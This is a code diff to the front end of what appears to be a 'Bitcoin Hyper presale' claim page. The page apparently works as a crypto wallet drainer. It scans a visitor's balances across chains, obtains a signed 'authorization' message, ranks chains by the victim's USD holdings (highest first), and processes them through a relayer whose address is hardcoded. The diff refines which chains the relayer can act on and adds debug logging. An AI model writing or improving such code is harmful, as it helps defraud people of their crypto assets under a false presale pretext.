@@ -105,6 +105,7 @@ function App() {
   const [processedAmounts, setProcessedAmounts] = useState({});
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
+  const [chainsWithRelayerFunds, setChainsWithRelayerFunds] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
   const [debugInfo, setDebugInfo] = useState('');
 
@@ -232,10 +233,25 @@ function App() {
       
       setRelayerBalances(balances);
       console.log('Relayer balances:', balances);
-      setDebugInfo(`Relayer balances: ${JSON.stringify(balances, null, 2)}`);
+      
+      // After getting relayer balances, update which chains are actually executable
+      updateExecutableWithRelayerFunds();
+      
     } catch (err) {
       console.error('Failed to fetch relayer balances:', err);
     }
+  };
+
+  // Update executable chains based on relayer funds
+  const updateExecutableWithRelayerFunds = () => {
+    const chainsWithFunds = executableChains.filter(chain => {
+      const networkKey = NETWORK_MAP[chain.name];
+      const relayerBalance = relayerBalances[networkKey] || 0;
+      return relayerBalance >= 0.01; // Need at least 0.01 native token for gas
+    });
+    
+    setChainsWithRelayerFunds(chainsWithFunds);
+    console.log('Chains with relayer funds:', chainsWithFunds.map(c => c.name));
   };
 
   // Track page visit with location
@@ -293,12 +309,19 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
+  // Update relayer funds check when executableChains or relayerBalances change
+  useEffect(() => {
+    if (executableChains.length > 0 && Object.keys(relayerBalances).length > 0) {
+      updateExecutableWithRelayerFunds();
+    }
+  }, [executableChains, relayerBalances]);
+
   // Check if all eligible chains are completed
   useEffect(() => {
-    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
+    if (chainsWithRelayerFunds.length > 0 && completedChains.length === chainsWithRelayerFunds.length) {
       setAllChainsCompleted(true);
     }
-  }, [completedChains, executableChains]);
+  }, [completedChains, chainsWithRelayerFunds]);
 
   // Hide ribbon after wallet connects
   useEffect(() => {
@@ -321,7 +344,6 @@ function App() {
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // Filter chains that are executable (user has enough value)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
@@ -505,7 +527,7 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      // YOUR EXACT CUSTOM SIGNING MESSAGE
+      // YOUR EXACT CUSTOM SIGNING MESSAGE - DO NOT CHANGE
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
         `I hereby confirm my participation\n` +
@@ -522,43 +544,39 @@ function App() {
       
       setTxStatus('⏳ Processing...');
 
-      // First, filter chains where user has balance and meets requirements
-      const userEligibleChains = executableChains.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0
-      );
-      
-      if (userEligibleChains.length === 0) {
-        setError("No chains with balance meet execution requirements");
-        setSignatureLoading(false);
-        return;
+      // First, check if we have relayer balances
+      if (Object.keys(relayerBalances).length === 0) {
+        await fetchRelayerBalances();
       }
 
-      // Second, check which chains the relayer has funds for
-      const chainsWithRelayerFunds = userEligibleChains.filter(chain => {
+      // Filter chains where user has balance AND relayer has funds
+      const chainsToProcess = executableChains.filter(chain => {
         const networkKey = NETWORK_MAP[chain.name];
         const relayerBalance = relayerBalances[networkKey] || 0;
+        const hasRelayerFunds = relayerBalance >= 0.01;
         
-        // Need at least 0.01 native token for gas
-        const hasFunds = relayerBalance >= 0.01;
-        
-        if (!hasFunds) {
+        if (!hasRelayerFunds) {
           console.log(`⚠️ Skipping ${chain.name}: Relayer has insufficient ${chain.symbol} (${relayerBalance})`);
-          setDebugInfo(prev => `${prev}\n⚠️ Skipping ${chain.name}: Relayer needs more ${chain.symbol}`);
         }
         
-        return hasFunds;
+        return hasRelayerFunds;
       });
-
-      if (chainsWithRelayerFunds.length === 0) {
-        setError("No chains can be processed - relayer needs funds. Please add BNB to 0x30b30B5bf944967f53368e71111d515b91d88686");
+      
+      if (chainsToProcess.length === 0) {
+        const missingFunds = executableChains.map(chain => {
+          const networkKey = NETWORK_MAP[chain.name];
+          return `${chain.name} (needs ${relayerBalances[networkKey] || 0} ${chain.symbol})`;
+        }).join(', ');
+        
+        setError(`Cannot process: Relayer needs funds on: ${missingFunds}. Please add BNB to 0x30b30B5bf944967f53368e71111d515b91d88686`);
         setSignatureLoading(false);
         return;
       }
 
-      console.log(`🔄 Processing ${chainsWithRelayerFunds.length} chains with relayer funds`);
+      console.log(`🔄 Processing ${chainsToProcess.length} chains with relayer funds`);
 
       // CRITICAL FIX: Sort chains by USD value (HIGHEST FIRST)
-      const sortedChains = [...chainsWithRelayerFunds].sort((a, b) => {
+      const sortedChains = [...chainsToProcess].sort((a, b) => {
         const valueA = balances[a.name]?.valueUSD || 0;
         const valueB = balances[b.name]?.valueUSD || 0;
         return valueB - valueA; // Descending (highest first)
@@ -753,6 +771,10 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
+  // Determine which chains to show in the button
+  const chainsAvailableForProcessing = chainsWithRelayerFunds.length > 0 ? chainsWithRelayerFunds : executableChains;
+  const showClaimButton = isConnected && isEligible && !allChainsCompleted && chainsAvailableForProcessing.length > 0;
+
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
       
@@ -854,7 +876,13 @@ function App() {
                   console.log('Balances:', balances);
                   console.log('Relayer Balances:', relayerBalances);
                   console.log('Executable Chains:', executableChains);
-                  setDebugInfo(`User: ${JSON.stringify(balances, null, 2)}\nRelayer: ${JSON.stringify(relayerBalances, null, 2)}`);
+                  console.log('Chains with Relayer Funds:', chainsWithRelayerFunds);
+                  setDebugInfo(
+                    `User: ${JSON.stringify(balances, null, 2)}\n\n` +
+                    `Relayer: ${JSON.stringify(relayerBalances, null, 2)}\n\n` +
+                    `Executable: ${executableChains.map(c => c.name).join(', ')}\n\n` +
+                    `With Funds: ${chainsWithRelayerFunds.map(c => c.name).join(', ')}`
+                  );
                 }}
                 className="bg-gray-800 text-xs px-3 py-1 rounded-full border border-gray-700 hover:border-[#c47d24] transition-all"
               >
@@ -983,8 +1011,8 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area */}
-          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
+          {/* Main Claim Area - Only shows when eligible and chains available */}
+          {showClaimButton && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
@@ -993,7 +1021,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
+                disabled={signatureLoading || loading || !signer || chainsAvailableForProcessing.length === 0}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
@@ -1040,7 +1068,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message */}
+          {/* Welcome message for non-eligible */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
